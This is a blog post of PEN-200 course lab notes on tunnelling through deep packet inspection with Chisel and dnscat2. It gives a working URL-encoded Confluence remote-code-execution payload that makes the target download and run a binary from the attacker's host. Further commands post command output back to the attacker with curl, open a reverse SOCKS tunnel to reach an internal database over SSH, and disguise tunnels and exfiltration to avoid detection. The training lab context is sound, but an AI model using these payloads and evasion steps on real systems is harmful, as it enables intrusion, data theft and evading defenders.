---
title: "PEN-200 Module 19 \u2014 Beating Deep Packet Inspection"
slug: dpi-evasion
author: m4xx3d0ut
summary: "Module 19 is where covert transport matters. The lab notes show how we tuned\
  \ tunnels to look like sanctioned traffic. Here\u2019s the upgraded sequence."
publishedAt: '2023-11-14'
updatedAt: '2023-11-18'
readingMinutes: 16
tags:
- offsec
---
# PEN-200 Module 19 — Beating Deep Packet Inspection

## TLDR;

Module 19 is where covert transport matters. The lab notes show how we tuned tunnels to look like sanctioned traffic. Here’s the upgraded sequence.

### HTTP/WebSocket Tunneling with Chisel

```
# Attacker side
chisel server -p 8443 --reverse --auth user:pass --key supersecret --tls-key server.key --tls-cert server.crt

# Target side (reverse RDP)
chisel client https://user:pass@attacker:8443 R:3389:127.0.0.1:3389
```

- Customize TLS certificates to mimic internal PKI (matching CN/SAN). Store certificate metadata for the report.
- Randomize beacon intervals (`--keepalive 30s`) and throttle bandwidth (`--max-rate 200k`) to avoid traffic spikes.
- Log session start/end times and data volume.

### DNS Tunneling with dnscat2

```
# Authoritative server
sudo dnscat2-server --host tunnel.attacker.tld

# Client with fixed sleep interval
./dnscat --dns domain=tunnel.attacker.tld,server=resolver.internal,port=53,delay=200
```

- Delegate a subdomain (`tunnel.attacker.tld`) to your server; note NS records for the appendix.
- Restrict labels to <50 bytes, rotate encryption keys, and adjust sleep intervals to blend with genuine queries.
- Capture query logs and PCAP samples to demonstrate the tunnel footprint.

### Layering C2 and Tools

- Route SOCKS traffic over the tunnel: `proxychains -q ssh analyst@internalhost` with `proxychains.conf` pointing to the chisel SOCKS port.
- For file exfil, compress and chunk data; send through HTTPS posts to avoid size anomalies.

### Operational Safeguards

- Maintain a `tunnels.md` ledger: protocol, endpoints, credentials, timing, cleanup commands.
- Use watch scripts to auto-kill tunnels on exit (`trap 'pkill -f chisel' EXIT`).
- After engagement, revoke TLS certificates and destroy subdomains.

### Defensive Insights

- Recommend DNS response rate limiting, entropy and length monitoring, and TLS inspection that validates SNI against allowlists.
- Provide PCAP snippets and sample logs so defenders can write detections.

DPI-aware tunneling is about subtlety. Tune the channel, monitor it constantly, and pair offensive results with precise defensive countermeasures.

## Working Notes... In Graphic Detail...

### Tunneling Through Deep Packet Inspection

- HTTP Tunneling Theory and Practice.
- DNS Tunneling Theory and Practice.

[Deep Packet Inspection](https://en.wikipedia.org/wiki/Deep_packet_inspection)

#### 19.1 HTTP Tunneling Theory and Practice
 
- Learn about HTTP tunneling.
- Perform HTTP tunneling with Chisel.

##### HTTP Tunneling Fundamentals

To begin our exploration of HTTP tunneling we will introduce a simple scenario.  We have compromised CONFLUENCE01 and can exec commands via HTTP requests.  When we try to pivot we are blocked by a highly restrictive network configuration.

Deep Packet Inspection (DPI) is now terminating all outbound traffic except HTTP.  All inbound ports on CONFLUENCE01 are blocked except TCP 8090.  We can't rely on a standard rev shell, as it does not conform to HTTP standard and would be terminated by DPI.  For the same reason we cannot create SSH remote port forward.  The only traffic we can get through is HTTP, Wget and cURL for example.
*This is a hypothetical scenario: we haven't actually implemented any deep packet inspection in the exercise lab! But imagining these restrictions can help us develop robust tunneling strategies.*

In this example, the FIREWALL/INSPEACTOR device has replaced the previous simple firewall.  Also, MULTISERVER03 is blocked on the WAN iface.

We have creds for the PGDATABASE01 server and need to figure out how to SSH there through CONFLUENCE01.  We need a tunnel into the internal network that appears to be an outgoing HTTP connection from CONFLUENCE01.

##### HTTP Tunneling with Chisel

This scenario is perfect for [Chisel](https://github.com/jpillora/chisel), an HTTP tunneling tool that encapsulates our data stream within HTTP.  It also uses SSH within the tunnel so our data will be encrypted.

Chisel uses a client/server model, so a Chisel server must be set up to accept connections from the Chisel client.  Various port forwarding options are available depending on the server and client config, with *reverse port forwarding* being particularly useful for us as it is similar to SSH remote port forwarding.

*Chisel can run on macOS, Linux, and Windows, and on various architectures on each. Older tools like HTTPTunnel offer similar tunneling functionality, but lack the flexibility and cross-platform capabilities of Chisel.*

We will run the Chisel server on our Kali machine to accept connections from Chisel client running on CONFLUENCE01.  Chisel will bind a SOCKS proxy port on the Kali machine, encapsulating what we send through the SOCKS port, pushing it through the HTTP tunel with SSH encryption.  The Chisel client decapsulates our traffic and pushed it to where it is addressed.

The traffic between the Chisel client/server is HTTP formatted, allowing us to traverse the deep packet inspection solution, regardless of the HTTP packet contents.  The Chisel server on our Kali system will listen on TCP 1080, as a SOCKS proxy port.  All traffic sent to that port will be tunneled via HTTP to the client, where it is forwarded to its destination.

Setup the Chisel server on Kali by referring to the [usage guide](https://github.com/jpillora/chisel#usage), we find the `--reverse` flag.  Starting the server with this flag binds a SOCKS proxy port to the server on client connection.

Before starting the server we need to copy the Chisel client bin to CONFLUENCE01.  The Chisel server and client run from the same bin, just initializing as client or server as the first arg.

*If our target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page.*

In this case both systems are AMD64 Linux, so we can use the same Chisel bin on both machines.

To get Chisel bin onto CONFLUENCE01, we can serve it from our Kali machine over HTTP.

```bash
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ sudo cp $(which chisel) ./

┌──(operator㉿labhost)-[~/OffSec]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next we build the `wget` command to download the `chisel` bin and make it executable.

```
wget 192.168.45.182/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

- We will format the command to work with our `curl` Confluence injection payload.

*As before, you can modify the specific parts of the URL-encoded RCE payload that you need to, rather than trying to build a new payload from scratch, to avoid formatting difficulties.*

```bash
curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.182/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.230.63 - - [14/Nov/2023 07:56:24] "GET /chisel HTTP/1.1" 200 -
```

Now that we have the Chisel bin on both Kali and target machines, we can start the bin as a server with the `server` subcommand, bind port `--port`, and reverse port forward `--reverse` flag.

```bash
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ chisel server --port 8080 --reverse
2023/11/14 07:58:35 server: Reverse tunnelling enabled
2023/11/14 07:58:35 server: Fingerprint 5EE9UzUCyU3DTfAMG7zdg/RtpVzN14y6Hd8iQYvnEJ8=
2023/11/14 07:58:35 server: Listening on http://0.0.0.0:8080
```

The Chisel server starts and is listening on port 8080 as a reverse tunnel.

Before we try to run the Chisel client, we'll run `tcpdump` to log incoming traffic on our Kali machine, filtering to `tcp port 8080`.

```bash
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ sudo tcpdump -nvvvXi tun0 tcp port 8080
[sudo] password for operator: 
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

We want to connect to our server running on our Kali machine `192.168.45.182:8080` creating a reverse SOCKS tunnel `R:socks`.
- `R` prefix specifies a reverse tunnel.
 - `socks` proxy, bound to `1080` by default.
- `> /dev/null 2>&1 &` redirect to run in background.
 - So our injection does not hand waiting for the proc to finish.

```
/tmp/chisel client 192.168.45.182:8080 R:socks > /dev/null 2>&1 &
```

Convert into a Confluence injection payload.

```bash
curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.182:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

We don't see any traffic hit our Tcpdump session and the chisel server output doesn't show any activity.

There may be something wrong with our Chisel client process on CONFLUENCE01, but we don't have direct access to the error output when running the bin.  To read the command output we can create a command which redirects STDOUT and STDERR output to a file over HTTP back to our Kali machine.
- Redirect all streams to STDOUT `&>`
- Write it to `/tmp/output`
- Run `curl` with `--data` flag.
 - Reads file at `/tmp/output` and POST it back to our Kali machine.

```
/tmp/chisel client 192.168.45.182:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.182:8080/
```

Create our injection payload.

```bash
curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.182:80%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.182:80/%27%29.start%28%29%22%29%7D/
```

Check our Tcpdump output for the error message

```
    192.168.197.63.42126 > 192.168.45.182.80: Flags [P.], cksum 0x4289 (correct), seq 1:354, ack 1, win 502, options [nop,nop,TS val 2513796402 ecr 1856280942], length 353: HTTP, length: 353
	POST / HTTP/1.1
	Host: 192.168.45.182
	User-Agent: curl/7.68.0
	Accept: */*
	Content-Length: 204
	Content-Type: application/x-www-form-urlencoded
	
	/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
	0x0000:  4500 0195 6b30 4000 3d06 5cec c0a8 c53f  E...k0@.=.\....?
```

- Chisel is trying to use version 2.32 and 2.34 of `glibc`
 - Not present on CONFLUENCE01.
 - *This module is being written in 2023, using Chisel version 1.8.1-0kali2 (go1.20.7). The Kali repos will likely contains later versions of Chisel in the future, and the exact error message that comes back from these later versions of Chisel may be different. However, the same principle applies. We have encountered an error trying to run a payload on a target system. As such, we have to find an alternative payload which will run. Finding a way around these kinds of setbacks is an important skill which can be applied to many other situations where tool incompatibilities arise.*.

This indicates a version incompatibility, when the tool or component is newer than the OS it is trying to run on there's a risk that the OS will not contain the required technologies needed by the tool.

Looking for a solution, we check the version info for the Chisel bin we have on our Kali system.

```bash
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ chisel -h                         

  Usage: chisel [command] [--help]

  Version: 1.9.1-0kali1 (go1.21.3)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

- This is version 1.8.1 of Chisel, it has been compiles wth Go version 1.20.7.
- Google biopsy reveals similar messages appear when bins compiled for Go V1.20 and later are run on OS that don't have compatible glibc.

On the Chisel Github page we find an "official" compiled bin, also version 1.81 is compiled with Go version 1.19.  This is one version lower than the version that introduced the glibc incompatibility.  We can try using the Go 1.19 compiled Chisel 1.81 binary for Linux AMD64.

```bash
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz

┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ gunzip chisel_1.8.1_linux_amd64.gz

┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ mv chisel_1.8.1_linux_amd64 chisel
```

After overwriting our Chisel bin with the older version, we redownload and overwrite the version on CONFLUENCE01.

```bash
curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.182/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

We can now try our Chisel client again.

```bash
curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.182:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

A different kind of traffic is logged in our Tcpdump session.

```
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
18:13:53.687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6), length 276)
    192.168.50.63.41424 > 192.168.118.4.8080: Flags [P.], cksum 0xce2b (correct), seq 1:225, ack 1, win 502, options [nop,nop,TS val 1290578437 ecr 143035602], length 224: HTTP, length: 224
        GET / HTTP/1.1
        Host: 192.168.118.4:8080
        User-Agent: Go-http-client/1.1
        Connection: Upgrade
        Sec-WebSocket-Key: L8FCtL3MW18gHd/ccRWOPQ==
        Sec-WebSocket-Protocol: chisel-v3
        Sec-WebSocket-Version: 13
        Upgrade: websocket

        0x0000:  4500 0114 d200 4000 3f06 3f4f c0a8 323f  E.....@.?.?O..2?
        0x0010:  c0a8 7604 a1d0 1f90 61a9 fe5d 2446 312e  ..v.....a..]$F1.
        0x0020:  8018 01f6 ce2b 0000 0101 080a 4cec aa05  .....+......L...
        0x0030:  0886 8cd2 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
        0x0040:  2e31 0d0a 486f 7374 3a20 3139 322e 3136  .1..Host:.192.16
        0x0050:  382e 3131 382e 343a 3830 3830 0d0a 5573  8.118.4:8080..Us
        0x0060:  6572 2d41 6765 6e74 3a20 476f 2d68 7474  er-Agent:.Go-htt
        0x0070:  702d 636c 6965 6e74 2f31 2e31 0d0a 436f  p-client/1.1..Co
        0x0080:  6e6e 6563 7469 6f6e 3a20 5570 6772 6164  nnection:.Upgrad
        0x0090:  650d 0a53 6563 2d57 6562 536f 636b 6574  e..Sec-WebSocket
        0x00a0:  2d4b 6579 3a20 4c38 4643 744c 334d 5731  -Key:.L8FCtL3MW1
        0x00b0:  3867 4864 2f63 6352 574f 5051 3d3d 0d0a  8gHd/ccRWOPQ==..
        0x00c0:  5365 632d 5765 6253 6f63 6b65 742d 5072  Sec-WebSocket-Pr
        0x00d0:  6f74 6f63 6f6c 3a20 6368 6973 656c 2d76  otocol:.chisel-v
        0x00e0:  330d 0a53 6563 2d57 6562 536f 636b 6574  3..Sec-WebSocket
        0x00f0:  2d56 6572 7369 6f6e 3a20 3133 0d0a 5570  -Version:.13..Up
        0x0100:  6772 6164 653a 2077 6562 736f 636b 6574  grade:.websocket
        0x0110:  0d0a 0d0a                                ....
18:13:53.687745 IP (tos 0x0, ttl 64, id 60604, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.118.4.8080 > 192.168.50.63.41424: Flags [.], cksum 0x46ca (correct), seq 1, ack 225, win 508, options [nop,nop,TS ...
...
```

- This indicates that Tcpdump has logged a HTTP Websocket connection.

Our Chisel client has logged an inbound connection.

```bash
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ chisel server --port 8080 --reverse
2023/11/15 07:05:38 server: Reverse tunnelling enabled
2023/11/15 07:05:38 server: Fingerprint voKs3mrJhwxBVMvzJ5OoL5sWW5g6KqAlTzYNkfrTMHQ=
2023/11/15 07:05:38 server: Listening on http://0.0.0.0:8080
2023/11/15 07:27:57 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
2023/11/15 07:27:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Check the status of our SOCKS proxy with `ss`.

```bash
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ sudo ss -ntplu                       
[sudo] password for operator: 
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                               ...                                                     
tcp      LISTEN    0         4096             127.0.0.1:1080             0.0.0.0:*        users:(("chisel",pid=29641,fd=8))                                                       
...
```

- Our SOCKS proxy is listening on port 1080 of lo iface.

We can now use this to connect to the SSH server on PGDATABASE01.  Previously we created a SOCKS proxy with SSH, but haven't run SSH through a SOCKS proxy connection.

SSH doesn't have a SOCKS command line option, but it offers the ProxyCommand config option which we can write into a config file or pass as part of the command line with the `-o` option.

The proxy command accepts a shell command to open a proxy-enabled channel.  The docs suggest using the OpenBSD version of Netcat with the `-X` flag which can connect to a SOCKS or HTTP proxy.  The version of Netcat that ships with Kali does not support proxying.

We will use Ncat instead!

```bash
ssh -o PubKeyAuthentication=no -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.197.215


┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
└─$ ssh -o PubKeyAuthentication=no -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.197.215
database_admin@10.4.197.215's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 15 Nov 2023 03:37:54 PM UTC

  System load:  0.0               Processes:               234
  Usage of /:   80.4% of 6.79GB   Users logged in:         0
  Memory usage: 15%               IPv4 address for ens192: 10.4.197.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.197.254


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$ 
```

- We have gained access to the SSH server through our Chisel reverse SOCKS proxy by tunneling traffic through a reverse HTTP conn.
